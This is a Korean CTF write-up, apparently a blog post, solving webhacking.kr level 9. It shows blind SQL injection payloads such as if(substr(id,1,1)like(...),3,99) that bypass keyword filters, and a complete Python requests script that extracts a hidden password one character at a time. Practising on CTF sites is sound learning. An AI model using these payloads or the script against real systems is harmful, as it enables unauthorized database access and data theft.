---
layout: post
title: Webhacking.kr | Level 9
subtitle: Webhacking CTF Problem Solving
categories: Web
tags: [Pentest, Web]
---

**본 문제는 [webhacking.kr](https://webhacking.kr)를 통해서 풀어 보실 수 있습니다.**

**해답을 이해하며 생각을 해보면서 풀이 해보시길 바랍니다.**

## 문제 내용

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/187905002-f63d0dae-4ad4-4c65-afde-bb8a792c8950.jpg" width = 320>
</p>

Password를 입력할 수 있는 TextArea와 클릭 할 수 있는 **1, 2, 3**이 존재한다.

* 1번

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/187905810-073da457-e371-4710-b85b-6c7949705ed4.jpg" width = 360>
</p>

* 2번은 Banana다.

* 3번

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/187905874-e77b5df9-6e6d-4357-a155-90742e37530b.jpg" width = 360>
</p>

column은 **id**와 **no**로 구성되어 있고 3번의 id가 password라 합니다. **즉, no=3의 id column 값을 구해야 한다.**

## 문제 풀이

패스워드의 값을 무작위로 여러 번 입력했을 때 접근 시도를 막지 않았기 때문에 Brute Force로 해도 가능할 것으로 보이지만 의도는 그렇지 않아 보인다. 이유는 아래와 같다.

`https://webhacking.kr/challenge/web-09/index.php?no=4` paramter인 no을 4로 입력했을 때와 `'`(싱글 쿼테이션), `SELECT, FROM, UNION` 처럼 SQL에 들어갈 모든 구문이 필터링되는 것을 알 수 있다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/187906800-988aceff-3ec4-402f-b09a-79e7bf870dc0.jpg" width = 360>
</p>

또한, **1, 2, 3**이 아닌 다른 값이 들어가면 Password TextArea를 제외하고는 Apple, Banana가 나오질 않는다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/187907333-c3fa774d-1794-43b7-99f6-8dfa79f79885.jpg" width = 360>
</p>

이로써, Blind SQL Injection을 시도해볼 수 있을 것으로 예상된다. 하지만 `AND, SELECT`등의 SQL 문법이 필터링되어 있다.

MySQL에서 사용될 수 있는 조건문으로는 `IF`도 있음을 해당 사이트에서 찾았으니 참고하시길 바랍니다.([조건문 정리 SITE](https://velog.io/@pm1100tm/MySQL-%EC%A1%B0%EA%B1%B4%EB%AC%B8-%EC%A0%95%EB%A6%AC))

### MySQL IF 조건

```sql
SELECT IF(2 > 1, 'TRUE', 'FALSE') AS result
```

이처럼 **IF(조건, 참일 때 값, 거짓일 때 값)**으로 확인 할 수 있다. 우리는 참일 때는 1, 2와 같이 Apple 혹은 Banana를 띄우고, 거짓일 때는 no=4, 5, 6 처럼 아무것도 출력을 안하는 값을 넣는다면 Blind SQL Injection이 가능할 것이다. 또한, `like` 연산자를 통해 `=` 처럼 사용할 수 있다.

```sql
SELECT * FROM SAMPLE WHERE text like 'test_content';
```

이렇게 된다면 SAMPLE Table에서 test Column에서 'test_content'가 있다면 SELECT 하는 것처럼 `like`를 `=`처럼 사용하면 된다.

### Blind SQLi

#### id 글자 수 확인
그러면 우리가 해당 조건을 통해 사용할 문법은 아래와 같다.

```sql
no=if(length(id)like(6),1,99)
```

이렇게 해당 값이 옳다면 **no=1**로 Request하여 Apple이 나올 것이다. 그리고 우리는 no=3의 id를 알아야 하므로 두번째 인자를 **3**으로 변경하고 진행하겠습니다.

```python
i = 0 

def findIDLength(i):
    while True:
        sqli = url + 'if(length(id)like(' + str(i) + '),3,99)'
        r = requests.get(sqli, headers = headers, cookies = cookies)
        if (r.text).find('Apple') != -1 :
            print(f'ID LENGTH : {i}')
            return i
        i += 1

if __name__ == '__main__':
    idlength = findIDLength(i)
```

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/187924268-297dbe70-dbde-4d06-a90a-c111ada1a0c6.jpg" width = 360>
</p>

> 이렇게 no=3의 id 길이는 **열 한 글자**인 것을 알 수 있다.

#### id 확인

이제 첫 글자가 무엇인지 Blind하면 되는데 `CHAR`, `ASCII` 모두 필터링되어 있다. 그렇다면 어떻게 값을 넣으면 될까?

예상되는 글자에 대한 사전 텍스트를 만들어 놓고 한 글자씩 대입하면 될 것이다.

한 글자씩 확인해야 하기에 `substring`을 사용하려고 했는데 필터링되어 있다. 방법이 없을까 해서 찾아봤는데 `substr`라는 함수가 별도로 존재한 것을 알게 되었다.

DB에서 문자열 추출 시, Oracle에서는 `SUBSTR`를 사용하고 MySQL에서는 `SUBSTR`와 `SUBSTRING` 모두 사용하다고 합니다!

출처: [코딩하는 금융인:티스토리](https://codingspooning.tistory.com/entry/MySQL-문자열-자르기-SUBSTR-SUBSTRING)

그래서 글자를 확인하는 것을 `substr`로 사용하고, `=` 은 `like`를 사용하여 대체하겠습니다.

```sql
if(substr(id,1,1)like('a'),3,99)
```

* **substr(id, 1, 1)** : **id**에서 시작지점 **1** 부터(두번째 인자) **1** 한 글자(세번째 인자)만큼 가져온다. 
   * substr('abcd', 1, 2) : **ab**

* **substr**로 가져온 하나의 값이 `like('a')` **'a'**와 같은지 비교

* 같으면 **3** return, 다르면 **99** return

이것을 응용하여 위 ID의 길이와 하나로 합치면 아래와 같은 스크립트가 완성된다.

```python
import requests

headers = {
    'Cache-Control': 'max-age=0',
    'Sec-Ch-Ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': 'Windows',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'close'
}
cookies = {
        'PHPSESSID' : '본인 PHPSESSID'
}

url = 'https://webhacking.kr/challenge/web-09/index.php?no='
i = 0
key = 'abcdefghijklmnopqrstuvwxyz01234567890`~!@#$%^&*()_+'

def findIDLength(i):
    while True:
        sqli = url + 'if(length(id)like(' + str(i) + '),3,99)'
        r = requests.get(sqli, headers = headers, cookies = cookies)
        if (r.text).find('Secret') != -1:
            print(f'ID LENGTH : {i}')
            return i
        i += 1


def findID(i, j):
    passwd = ''
    print("no'3 password : ", end = '', flush = True)
    while j <= i:
        for k in range(len(key)):
            key_hex = hex(ord(key[k])) # 사전 파일과 같이 key라는 값을 받아서 '0x41' 변환
            sqli = url + 'if(substr(id,' + str(j) + ',1)like(' + key_hex + '),3,99)'
            r = requests.get(sqli, headers = headers, cookies = cookies)
            if (r.text).find('Secret') != -1:
                passwd += str(key[k])
                print(str(key[k]), end = '', flush = True)
                break
        j += 1

if __name__ == '__main__':
    idlength = findIDLength(i)
    findID(idlength, 1)
    print('\n------------------')
```

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/188059587-781bb471-40a8-4dc5-9a6e-4e84a6542257.jpg" width = 360>
</p>